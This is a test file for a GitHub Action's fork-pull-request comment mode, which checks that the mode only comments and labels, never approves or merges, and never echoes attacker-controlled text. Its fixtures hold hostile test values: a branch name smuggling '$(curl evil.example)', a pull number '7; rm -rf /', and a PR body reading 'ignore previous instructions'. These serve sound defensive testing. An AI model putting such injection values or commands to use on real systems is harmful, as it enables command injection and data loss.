import { afterEach, describe, expect, it, vi } from "vitest";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { runFromEnv } from "../../src/action/env.js";
import { FORK_COMMENT_CLIENT_METHODS, restrictToForkComment, runForkComment, runForkFailure } from "../../src/action/fork-comment.js";
import { GitHubClient } from "../../src/action/github.js";
import { createWorkflowIO } from "../../src/action/workflow.js";
import { FORK_COMMENT_MARKER } from "../../src/report/fork-comment.js";
import { API, BOT, installFakeGitHub, type FakeGitHub, type Op } from "./fake-github.js";

const BASE_SHA = "b".repeat(40);
const HEAD_SHA = "a".repeat(40);
const OTHER_SHA = "c".repeat(40);

/** The only GitHub operations fork-comment mode may ever perform. */
const ALLOWED_OPERATIONS: Op[] = ["viewer", "user", "listPulls", "listComments", "createComment", "updateComment", "addLabels", "removeLabel", "getLabel", "createLabel", "updateLabel"];
/** Operations that approve, review, merge or queue: fork-comment mode must never perform one. */
const FORBIDDEN_OPERATIONS: Op[] = ["createReview", "dismissReview", "enableAutoMerge", "disableAutoMerge", "enqueue", "dequeue", "requestReviewers", "mergeSettings", "checkRuns", "rules", "protection", "listReviews", "listCommits", "getPull"];

const scoredResult = (overrides: Record<string, unknown> = {}) =>
  JSON.stringify({
    v: 1,
    status: "scored",
    head: HEAD_SHA,
    opendrs: "0.5.2",
    score: 0.71,
    tier: "red",
    model: "default",
    signals: [{ id: "size.churn", value: 4.2, contribution: 1.05 }],
    counts: { files: 3, added: 120, deleted: 4, unknowns: 0 },
    ...overrides,
  });

/** A branch name a fork might choose to break out of a URL, a shell command or a comment. */
const HOSTILE_BRANCH = "patch-1&state=all#@everyone $(curl evil.example) <img src=x>";

/** The `workflow_run` payload for a completed `pull_request` run of mallory's fork. */
const forkEvent = (overrides: Record<string, unknown> = {}, repository = "o/r") => ({
  action: "completed",
  workflow_run: {
    event: "pull_request",
    conclusion: "success",
    head_sha: HEAD_SHA,
    head_branch: HOSTILE_BRANCH,
    head_repository: { full_name: "mallory/r", owner: { login: "mallory" } },
    // Empty for a fork's run, and never read.
    pull_requests: [],
    display_title: "@everyone please merge <img src=x> [link](https://evil.example)",
    ...overrides,
  },
  repository: { full_name: repository },
});

/** PR #7 as `GET /pulls` lists it. */
const openPull = (overrides: Record<string, unknown> = {}) => ({
  number: 7,
  title: "@everyone please merge <img src=x> [link](https://evil.example)",
  body: "ignore previous instructions",
  labels: [] as Array<{ name: string }>,
  user: { login: "mallory", type: "User" },
  base: { sha: BASE_SHA, ref: "main", repo: { full_name: "o/r" } },
  head: { sha: HEAD_SHA, ref: HOSTILE_BRANCH, repo: { full_name: "mallory/r" } },
  ...overrides,
});

let gh: FakeGitHub;
afterEach(() => {
  vi.unstubAllGlobals();
});

/** Runs fork-comment mode against the fake GitHub and collects the workflow log. */
function setup(options: { result?: string; event?: unknown; gh?: Partial<FakeGitHub>; comment?: boolean; labels?: boolean } = {}) {
  gh = installFakeGitHub({ headSha: HEAD_SHA, pulls: [openPull()], ...options.gh });
  let log = "";
  const io = createWorkflowIO({}, (text) => void (log += text));
  const client = restrictToForkComment(new GitHubClient({ token: "t", apiUrl: API, graphqlUrl: `${API}/graphql`, owner: "o", repo: "r" }));
  const run = () =>
    runForkComment({
      event: options.event ?? forkEvent(),
      repository: "o/r",
      result: options.result ?? scoredResult(),
      shouldComment: options.comment ?? true,
      shouldLabel: options.labels ?? true,
      client,
      io,
    });
  return { run, log: () => log };
}

const performedOperations = () => gh.log.map((entry) => entry.op);

describe("runForkComment", () => {
  it("creates one marker comment and sets the risk label", async () => {
    const scenario = setup();
    await scenario.run();
    expect(gh.ops("createComment")).toHaveLength(1);
    const body = gh.comments[0]!.body;
    expect(body.startsWith(`${FORK_COMMENT_MARKER}\n`)).toBe(true);
    expect(body).toContain("Diff risk 0.71 · red");
    expect(body).toMatch(/fork pull request/);
    expect(gh.labels).toEqual(["risk:red"]);
  });

  it("renders nothing from the PR's title, body, branch name or author", async () => {
    const scenario = setup();
    await scenario.run();
    const body = gh.comments[0]!.body;
    expect(body).not.toMatch(/everyone|evil|img|mallory|patch-1|ignore previous|curl/);
    expect(body).not.toMatch(/@\w/);
  });

  it("updates its own earlier comment instead of adding another", async () => {
    const scenario = setup({ gh: { comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nold`, user: BOT }] } });
    await scenario.run();
    expect(gh.ops("createComment")).toHaveLength(0);
    expect(gh.ops("updateComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/comments/5"]);
    expect(gh.comments[0]!.body).toContain("Diff risk 0.71");
  });

  it("never edits a comment it does not own: another user's copy of the marker, or the main opendrs comment", async () => {
    const scenario = setup({
      gh: {
        comments: [
          { id: 1, body: `${FORK_COMMENT_MARKER}\nforged`, user: { login: "mallory", type: "User" } },
          { id: 2, body: "<!-- opendrs -->\nmain report", user: BOT },
          { id: 3, body: `quoting it: ${FORK_COMMENT_MARKER}`, user: BOT },
        ],
      },
    });
    await scenario.run();
    expect(gh.ops("updateComment")).toHaveLength(0);
    expect(gh.ops("createComment")).toHaveLength(1);
    expect(gh.comments.slice(0, 3).map((comment) => comment.body)).toEqual([`${FORK_COMMENT_MARKER}\nforged`, "<!-- opendrs -->\nmain report", `quoting it: ${FORK_COMMENT_MARKER}`]);
  });

  it("replaces a stale risk label and leaves every other label alone", async () => {
    const labels = ["risk:green", "bug", "opendrs:hold", "captain:quick", "risk:custom"];
    const scenario = setup({ gh: { labels: [...labels], pulls: [openPull({ labels: labels.map((name) => ({ name })) })] } });
    await scenario.run();
    expect(gh.ops("removeLabel").map((entry) => decodeURIComponent(entry.path))).toEqual(["/repos/o/r/issues/7/labels/risk:green"]);
    expect(gh.ops("addLabels").map((entry) => entry.body)).toEqual([{ labels: ["risk:red"] }]);
    expect(gh.labels.sort()).toEqual(["bug", "captain:quick", "opendrs:hold", "risk:custom", "risk:red"]);
  });

  it("honours comment: false and labels: false", async () => {
    const scenario = setup({ comment: false, labels: false });
    await scenario.run();
    expect(performedOperations()).toEqual(["listPulls"]);
  });

  it("comments that a too-large PR was not scored and sets no risk label, removing a stale one", async () => {
    const scenario = setup({
      result: JSON.stringify({ v: 1, status: "too-large", head: HEAD_SHA, opendrs: "0.5.2", reason: "files", limit: 2000 }),
      gh: { labels: ["risk:green"], pulls: [openPull({ labels: [{ name: "risk:green" }] })] },
    });
    await scenario.run();
    expect(gh.comments[0]!.body).toMatch(/too large to score/);
    expect(gh.labels).toEqual([]);
    expect(gh.ops("addLabels")).toHaveLength(0);
  });

  describe("fails visibly when GitHub refuses a write, so a stale score is never left looking current", () => {
    it("a comment the token may not write (403): GitHub's message and the permission it needs", async () => {
      const scenario = setup({ gh: { forbid: new Set<Op>(["createComment"]) } });
      await expect(scenario.run()).rejects.toThrow(/403 Resource not accessible by integration.*pull-requests: write/);
      expect(scenario.log()).not.toMatch(/::warning::/);
    });

    it("an update of its own comment the token may not write (403)", async () => {
      const scenario = setup({ gh: { forbid: new Set<Op>(["updateComment"]), comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nold`, user: BOT }] } });
      await expect(scenario.run()).rejects.toThrow(/403/);
    });

    it("a label the token may not add or remove (403), after the comment was written", async () => {
      const addRefused = setup({ gh: { forbid: new Set<Op>(["addLabels"]) } });
      await expect(addRefused.run()).rejects.toThrow(/403 Resource not accessible by integration.*issues: write/);
      expect(gh.ops("createComment")).toHaveLength(1);
      vi.unstubAllGlobals();
      const removeRefused = setup({ gh: { forbid: new Set<Op>(["removeLabel"]), labels: ["risk:green"], pulls: [openPull({ labels: [{ name: "risk:green" }] })] } });
      await expect(removeRefused.run()).rejects.toThrow(/403/);
    });

    it("a server error (500) on the comment or a label is not swallowed", async () => {
      for (const failing of ["listComments", "createComment", "addLabels"] as Op[]) {
        const scenario = setup({ gh: { fail: new Set<Op>([failing]) } });
        await expect(scenario.run()).rejects.toThrow(/500 Server Error/);
        vi.unstubAllGlobals();
      }
    });

    it("through the Action: exit code 1 and GitHub's message as the error", async () => {
      setup({ gh: { forbid: new Set<Op>(["createComment"]) } });
      const directory = mkdtempSync(join(tmpdir(), "opendrs-fork-comment-"));
      try {
        writeFileSync(join(directory, "event.json"), JSON.stringify(forkEvent()));
        let log = "";
        const env = { "INPUT_GITHUB-TOKEN": "t", INPUT_MODE: "fork-comment", INPUT_RESULT: scoredResult(), GITHUB_EVENT_PATH: join(directory, "event.json"), GITHUB_REPOSITORY: "o/r", GITHUB_WORKSPACE: directory };
        expect(await runFromEnv(env, (text) => void (log += text))).toBe(1);
        expect(log).toMatch(/::error::GitHub POST \/repos\/o\/r\/issues\/7\/comments failed: 403 Resource not accessible by integration/);
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }
    });
  });

  describe("finds its own comment", () => {
    it("updates the newest of two of its marker comments", async () => {
      const scenario = setup({ gh: { comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nolder`, user: BOT }, { id: 6, body: `${FORK_COMMENT_MARKER}\nnewer`, user: BOT }] } });
      await scenario.run();
      expect(gh.ops("updateComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/comments/6"]);
      expect(gh.ops("createComment")).toHaveLength(0);
    });

    it("when the token's account is unknown, counts only github-actions[bot]'s marker comments as its own", async () => {
      const otherBot = { login: "other-app[bot]", type: "Bot" as const };
      // GraphQL and GET /user both refuse, so the token's login is unknown.
      const onlyOtherBot = setup({ gh: { forbid: new Set<Op>(["viewer"]), comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nforged`, user: otherBot }] } });
      await onlyOtherBot.run();
      expect(gh.ops("updateComment")).toHaveLength(0);
      expect(gh.ops("createComment")).toHaveLength(1);
      vi.unstubAllGlobals();
      const both = setup({ gh: { forbid: new Set<Op>(["viewer"]), comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nours`, user: BOT }, { id: 6, body: `${FORK_COMMENT_MARKER}\nforged`, user: otherBot }] } });
      await both.run();
      expect(gh.ops("updateComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/comments/5"]);
    });

    it("reads at most 10 pages of comments, and fails rather than add a second comment past them", async () => {
      const chatter = Array.from({ length: 1001 }, (_, index) => ({ id: index + 1, body: "+1", user: { login: "mallory", type: "User" as const } }));
      const scenario = setup({ gh: { comments: chatter } });
      await expect(scenario.run()).rejects.toThrow(/more than 1000 comments/);
      expect(gh.ops("listComments")).toHaveLength(10);
      expect(gh.ops("createComment")).toHaveLength(0);
      vi.unstubAllGlobals();
      const withOwn = chatter.map((comment) => (comment.id === 950 ? { ...comment, body: `${FORK_COMMENT_MARKER}\nold`, user: BOT } : comment));
      const found = setup({ gh: { comments: withOwn } });
      await found.run();
      expect(gh.ops("updateComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/comments/950"]);
    });
  });

  describe("changes risk labels only when needed", () => {
    it("makes no label call when the pull request already has exactly the right one, even listed twice", async () => {
      const scenario = setup({ gh: { labels: ["risk:red"], pulls: [openPull({ labels: [{ name: "risk:red" }, { name: "risk:red" }] })] } });
      await scenario.run();
      expect(gh.ops("addLabels")).toHaveLength(0);
      expect(gh.ops("removeLabel")).toHaveLength(0);
    });

    it("removes both stale risk labels and adds the right one", async () => {
      const scenario = setup({ gh: { labels: ["risk:green", "risk:yellow"], pulls: [openPull({ labels: [{ name: "risk:green" }, { name: "risk:yellow" }] })] } });
      await scenario.run();
      expect(gh.ops("removeLabel").map((entry) => decodeURIComponent(entry.path))).toEqual(["/repos/o/r/issues/7/labels/risk:green", "/repos/o/r/issues/7/labels/risk:yellow"]);
      expect(gh.labels).toEqual(["risk:red"]);
    });

    it("passes when a stale label is already gone (404 on removal)", async () => {
      const scenario = setup({ gh: { labels: [], pulls: [openPull({ labels: [{ name: "risk:green" }] })] } });
      await expect(scenario.run()).resolves.toBeUndefined();
      expect(gh.ops("removeLabel")).toHaveLength(1);
      expect(gh.labels).toEqual(["risk:red"]);
    });
  });

  describe("rejects", () => {
    it("a result scored for a different commit than the event's head, before any GitHub call", async () => {
      const scenario = setup({ result: scoredResult({ head: OTHER_SHA }) });
      await expect(scenario.run()).rejects.toThrow(/different commit/);
      expect(gh.log).toEqual([]);
    });

    it("a result that fails validation, before any GitHub call", async () => {
      const scenario = setup({ result: scoredResult({ tier: "green", approve: true }) });
      await expect(scenario.run()).rejects.toThrow(/not a valid opendrs fork result/);
      expect(gh.log).toEqual([]);
    });

    it("an empty result, as when the score job produced no output", async () => {
      const scenario = setup({ result: "" });
      await expect(scenario.run()).rejects.toThrow(/not a valid opendrs fork result/);
      expect(gh.log).toEqual([]);
    });

    it("a result that names its own PR number or repository: those come from the event only", async () => {
      for (const extra of [{ number: 1 }, { pr: 1 }, { repo: "victim/other" }, { repository: "victim/other" }]) {
        const scenario = setup({ result: scoredResult(extra) });
        await expect(scenario.run()).rejects.toThrow(/not a valid opendrs fork result/);
        expect(gh.log).toEqual([]);
      }
    });

    it("an event for another repository than the job's", async () => {
      const scenario = setup({ event: forkEvent({}, "victim/other") });
      await expect(scenario.run()).rejects.toThrow(/GITHUB_REPOSITORY/);
      expect(gh.log).toEqual([]);
    });

    it.each([
      ["no workflow_run payload", { schedule: "* * * * *" }],
      ["a pull_request payload instead of a workflow_run", { pull_request: openPull() }],
      ["a head sha that is not a commit hash", forkEvent({ head_sha: "refs/heads/main" })],
      ["no head repository", forkEvent({ head_repository: null })],
    ])("an event with %s", async (_, event) => {
      const scenario = setup({ event });
      await expect(scenario.run()).rejects.toThrow(/workflow_run/);
      expect(gh.log).toEqual([]);
    });
  });

  describe("finds the pull request itself and writes nothing when it cannot", () => {
    it("asks GitHub for the open pulls of the run's head owner and branch, URL-encoded", async () => {
      const scenario = setup();
      await scenario.run();
      expect(gh.ops("listPulls").map((entry) => entry.path)).toEqual([`/repos/o/r/pulls?state=open&head=${encodeURIComponent(`mallory:${HOSTILE_BRANCH}`)}&per_page=100`]);
    });

    /** Runs with `pulls` as the listing and expects no write and a notice. */
    const expectNoWrite = async (options: Parameters<typeof setup>[0], notice: RegExp) => {
      const scenario = setup(options);
      await expect(scenario.run()).resolves.toBeUndefined();
      for (const operation of performedOperations()) expect(operation).toBe("listPulls");
      expect(gh.comments).toEqual([]);
      expect(gh.labels).toEqual([]);
      expect(scenario.log()).toMatch(notice);
    };

    it("when the run was not started by a pull_request event, without any GitHub call", async () => {
      await expectNoWrite({ event: forkEvent({ event: "push" }) }, /::notice::.*not started by a pull_request event/);
      expect(gh.log).toEqual([]);
      await expectNoWrite({ event: forkEvent({ event: "pull_request_target" }) }, /::notice::/);
      expect(gh.log).toEqual([]);
    });

    it("when the run's head repository is this repository (not a fork), without any GitHub call", async () => {
      await expectNoWrite({ event: forkEvent({ head_repository: { full_name: "O/R", owner: { login: "o" } } }) }, /::notice::.*not from a fork/);
      expect(gh.log).toEqual([]);
    });

    it("when no open pull request matches", async () => {
      await expectNoWrite({ gh: { pulls: [] } }, /::notice::.*no open pull request/);
    });

    it("when the pull request's head moved after the run: the run for the new head comments", async () => {
      await expectNoWrite({ gh: { pulls: [openPull({ head: { sha: OTHER_SHA, ref: HOSTILE_BRANCH, repo: { full_name: "mallory/r" } } })] } }, /::notice::.*no open pull request/);
    });

    it("when the listed pull request comes from another repository than the run's", async () => {
      await expectNoWrite({ gh: { pulls: [openPull({ head: { sha: HEAD_SHA, ref: HOSTILE_BRANCH, repo: { full_name: "mallory/other" } } })] } }, /::notice::/);
      await expectNoWrite({ gh: { pulls: [openPull({ head: { sha: HEAD_SHA, ref: HOSTILE_BRANCH, repo: null } })] } }, /::notice::/);
    });

    it("when the listed pull request targets another repository", async () => {
      await expectNoWrite({ gh: { pulls: [openPull({ base: { sha: BASE_SHA, ref: "main", repo: { full_name: "victim/other" } } })] } }, /::notice::/);
    });

    it("when two open pull requests match: it does not guess", async () => {
      await expectNoWrite({ gh: { pulls: [openPull(), openPull({ number: 8 })] } }, /::notice::.*more than one/);
    });

    it("when the listing holds entries that are not pull requests", async () => {
      await expectNoWrite({ gh: { pulls: [{ number: "7; rm -rf /", head: { sha: HEAD_SHA } }, null, "7"] } }, /::notice::/);
    });

    it("picks the one matching pull request out of a listing GitHub did not filter", async () => {
      const scenario = setup({
        gh: {
          pulls: [
            openPull({ number: 3, head: { sha: OTHER_SHA, ref: "other", repo: { full_name: "someone/r" } } }),
            openPull(),
            openPull({ number: 9, head: { sha: HEAD_SHA, ref: HOSTILE_BRANCH, repo: { full_name: "impostor/r" } } }),
          ],
        },
      });
      await scenario.run();
      expect(gh.ops("createComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/7/comments"]);
    });
  });
});

describe("fork-comment mode can never approve, review or merge", () => {
  it("performs only comment and label operations, whatever the result says", async () => {
    const results = [
      scoredResult(),
      scoredResult({ score: 0, tier: "green", signals: [] }),
      JSON.stringify({ v: 1, status: "too-large", head: HEAD_SHA, opendrs: "0.5.2", reason: "time", limit: 0 }),
    ];
    for (const result of results) {
      const scenario = setup({
        result,
        gh: { labels: ["risk:yellow"], comments: [{ id: 5, body: `${FORK_COMMENT_MARKER}\nold`, user: BOT }], pulls: [openPull({ labels: [{ name: "risk:yellow" }] })] },
      });
      await scenario.run();
      expect(performedOperations().length).toBeGreaterThan(0);
      for (const operation of performedOperations()) {
        expect(ALLOWED_OPERATIONS).toContain(operation);
        expect(FORBIDDEN_OPERATIONS).not.toContain(operation);
      }
      vi.unstubAllGlobals();
    }
  });

  it("the client it is handed has no method that approves, reviews, merges or queues", () => {
    const client = restrictToForkComment(new GitHubClient({ token: "t", apiUrl: API, graphqlUrl: `${API}/graphql`, owner: "o", repo: "r" }));
    expect(Object.keys(client).sort()).toEqual([...FORK_COMMENT_CLIENT_METHODS].sort());
    expect([...FORK_COMMENT_CLIENT_METHODS].sort()).toEqual(["addLabels", "createComment", "listCommentsUpTo", "listOpenPullsByHead", "removeLabel", "updateComment", "viewerLogin"]);
    for (const method of ["approve", "dismissReview", "enableAutoMerge", "disableAutoMerge", "enqueue", "dequeue", "requestReviewers", "graphql", "listReviews", "mergeSettings", "readBlob", "listPullFiles"]) {
      expect(client).not.toHaveProperty(method);
    }
    expect(Object.isFrozen(client)).toBe(true);
  });

  it("its module, and everything that module imports, never loads the approval or full-run code", () => {
    const sourceRoot = resolve(dirname(fileURLToPath(import.meta.url)), "../../src");
    const seenFiles = new Set<string>();
    const pendingFiles = [join(sourceRoot, "action/fork-comment.ts")];
    while (pendingFiles.length > 0) {
      const file = pendingFiles.pop()!;
      if (seenFiles.has(file)) continue;
      seenFiles.add(file);
      const source = readFileSync(file, "utf8");
      for (const match of source.matchAll(/from "(\.[^"]+)\.js"/g)) {
        const imported = resolve(dirname(file), `${match[1]}.ts`);
        if (existsSync(imported)) pendingFiles.push(imported);
      }
    }
    const loaded = [...seenFiles].map((file) => file.slice(sourceRoot.length + 1).replace(/\\/g, "/"));
    expect(loaded).toContain("action/fork-comment.ts");
    for (const forbidden of ["action/approval.ts", "action/run.ts", "action/sweep.ts", "engine.ts", "policy/gate.ts"]) expect(loaded).not.toContain(forbidden);

    // The mode's own source names no review, merge or queue call.
    const ownSource = readFileSync(join(sourceRoot, "action/fork-comment.ts"), "utf8").replace(/\/\*[\s\S]*?\*\/|\/\/.*/g, "");
    expect(ownSource).not.toMatch(/\.approve\(|dismissReview|enableAutoMerge|disableAutoMerge|enqueue|dequeue|requestReviewers|\.graphql\(|reconcileApproval/);
  });
});

describe("runFromEnv with mode: fork-comment", () => {
  let directory: string | undefined;
  afterEach(() => {
    if (directory) rmSync(directory, { recursive: true, force: true });
    directory = undefined;
  });

  function environment(extra: NodeJS.ProcessEnv = {}, event: unknown = forkEvent()) {
    directory = mkdtempSync(join(tmpdir(), "opendrs-fork-comment-"));
    const eventPath = join(directory, "event.json");
    const outputPath = join(directory, "output");
    writeFileSync(eventPath, JSON.stringify(event));
    writeFileSync(outputPath, "");
    gh = installFakeGitHub({ headSha: HEAD_SHA, pulls: [openPull()] });
    let log = "";
    const env: NodeJS.ProcessEnv = {
      "INPUT_GITHUB-TOKEN": "t",
      INPUT_MODE: "fork-comment",
      INPUT_RESULT: scoredResult(),
      GITHUB_EVENT_PATH: eventPath,
      GITHUB_EVENT_NAME: "workflow_run",
      GITHUB_REPOSITORY: "o/r",
      GITHUB_OUTPUT: outputPath,
      // No checkout in this job: the workspace is an empty directory.
      GITHUB_WORKSPACE: directory,
      ...extra,
    };
    return { env, write: (text: string) => void (log += text), log: () => log, output: () => readFileSync(outputPath, "utf8") };
  }

  it("comments without a checkout and sets the score and tier outputs", async () => {
    const scenario = environment();
    expect(await runFromEnv(scenario.env, scenario.write)).toBe(0);
    expect(gh.comments).toHaveLength(1);
    expect(gh.labels).toEqual(["risk:red"]);
    expect(scenario.output()).toMatch(/^score<<.*\n0\.7100\n/m);
    expect(scenario.output()).toMatch(/^tier<<.*\nred\n/m);
    for (const operation of performedOperations()) expect(ALLOWED_OPERATIONS).toContain(operation);
  });

  it("fails the job with a fixed message, and writes nothing, when the result is forged", async () => {
    const scenario = environment({ INPUT_RESULT: scoredResult({ head: OTHER_SHA }) });
    expect(await runFromEnv(scenario.env, scenario.write)).toBe(1);
    expect(scenario.log()).toMatch(/::error::.*different commit/);
    expect(gh.log).toEqual([]);
  });

  it("fails without touching an approval when the result is invalid: there is nothing to withdraw in this mode", async () => {
    const scenario = environment({ INPUT_RESULT: "::error::@everyone" });
    expect(await runFromEnv(scenario.env, scenario.write)).toBe(1);
    expect(scenario.log()).not.toContain("everyone");
    expect(gh.log).toEqual([]);
  });

  it("refuses to run a sweep event in this mode", async () => {
    const scenario = environment({ GITHUB_EVENT_NAME: "schedule" }, { schedule: "*/15 * * * *" });
    expect(await runFromEnv(scenario.env, scenario.write)).toBe(1);
    expect(gh.log).toEqual([]);
  });
});

describe("runFromEnv with approval and auto-merge switched on everywhere it could be", () => {
  it("fork-comment with a green result still performs only comment and label operations", async () => {
    const directory = mkdtempSync(join(tmpdir(), "opendrs-fork-comment-"));
    try {
      // A workspace config that would approve and auto-merge a green PR in full mode. This mode never reads it.
      writeFileSync(join(directory, ".opendrs.yml"), "autoApprove:\n  enabled: true\n");
      writeFileSync(join(directory, "event.json"), JSON.stringify(forkEvent()));
      gh = installFakeGitHub({ headSha: HEAD_SHA, pulls: [openPull()], checkRuns: [{ name: "ai-review", conclusion: "success" }], mergeQueue: true });
      const env: NodeJS.ProcessEnv = {
        "INPUT_GITHUB-TOKEN": "t",
        INPUT_MODE: "fork-comment",
        INPUT_RESULT: scoredResult({ score: 0.02, tier: "green", signals: [] }),
        "INPUT_BASE-CONFIG": "false",
        "INPUT_SAMPLE-SALT": "salt",
        INPUT_BRIEF: "true",
        GITHUB_EVENT_PATH: join(directory, "event.json"),
        GITHUB_EVENT_NAME: "workflow_run",
        GITHUB_REPOSITORY: "o/r",
        GITHUB_WORKSPACE: directory,
      };
      expect(await runFromEnv(env, () => {})).toBe(0);
      expect(gh.labels).toEqual(["risk:green"]);
      for (const operation of performedOperations()) expect(ALLOWED_OPERATIONS).toContain(operation);
      expect(gh.reviews).toEqual([]);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });
});

describe("fork-failure mode", () => {
  const ourComment = { id: 5, body: `${FORK_COMMENT_MARKER}\n### 🟢 Diff risk 0.05 · green`, user: BOT };

  function failureSetup(init: Partial<FakeGitHub> = {}, event: unknown = forkEvent()) {
    gh = installFakeGitHub({ headSha: HEAD_SHA, pulls: [openPull({ labels: [{ name: "risk:green" }, { name: "bug" }] })], labels: ["risk:green", "bug"], comments: [{ ...ourComment }], ...init });
    let log = "";
    const io = createWorkflowIO({}, (text) => void (log += text));
    const client = restrictToForkComment(new GitHubClient({ token: "t", apiUrl: API, graphqlUrl: `${API}/graphql`, owner: "o", repo: "r" }));
    return { run: () => runForkFailure({ event, repository: "o/r", shouldComment: true, shouldLabel: true, client, io }), log: () => log };
  }

  it("replaces its comment with a fixed 'not scored' text for the run's commit and removes the risk label", async () => {
    await failureSetup().run();
    expect(gh.ops("updateComment").map((entry) => entry.path)).toEqual(["/repos/o/r/issues/comments/5"]);
    expect(gh.comments[0]!.body).toBe(
      `${FORK_COMMENT_MARKER}\n### ⚪ Diff risk not scored\n\nNot scored: the scoring job failed for \`aaaaaaa\`. That is not a low score. The workflow run's log says why; re-run it, or review this pull request without a score.\n\n` +
        "<sub>Advisory only: opendrs never approves or merges a fork pull request, and this comment is not a review. [How fork pull requests are scored](https://error-path.github.io/opendrs/github-action.html#fork-pull-requests).</sub>\n" +
        "<sub>[github.com/error-path/opendrs](https://github.com/error-path/opendrs)</sub>\n",
    );
    expect(gh.labels).toEqual(["bug"]);
    for (const operation of performedOperations()) expect(ALLOWED_OPERATIONS).toContain(operation);
  });

  it("adds the comment when there is none yet, and writes nothing from the pull request", async () => {
    await failureSetup({ comments: [] }).run();
    expect(gh.ops("createComment")).toHaveLength(1);
    expect(gh.comments[0]!.body).not.toMatch(/everyone|evil|img|mallory|patch-1/);
  });

  it("does nothing for a run that did not finish, or a pull request it cannot find", async () => {
    await failureSetup({}, forkEvent({ conclusion: "action_required" })).run();
    expect(gh.log).toEqual([]);
    vi.unstubAllGlobals();
    await failureSetup({ pulls: [] }).run();
    expect(performedOperations()).toEqual(["listPulls"]);
  });

  it("runs through the Action as mode fork-failure, without a result input", async () => {
    const directory = mkdtempSync(join(tmpdir(), "opendrs-fork-failure-"));
    try {
      writeFileSync(join(directory, "event.json"), JSON.stringify(forkEvent({ conclusion: "failure" })));
      failureSetup();
      const env = { "INPUT_GITHUB-TOKEN": "t", INPUT_MODE: "fork-failure", GITHUB_EVENT_PATH: join(directory, "event.json"), GITHUB_REPOSITORY: "o/r", GITHUB_WORKSPACE: directory };
      expect(await runFromEnv(env, () => {})).toBe(0);
      expect(gh.comments[0]!.body).toMatch(/the scoring job failed for `aaaaaaa`/);
      expect(gh.labels).toEqual(["bug"]);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });
});
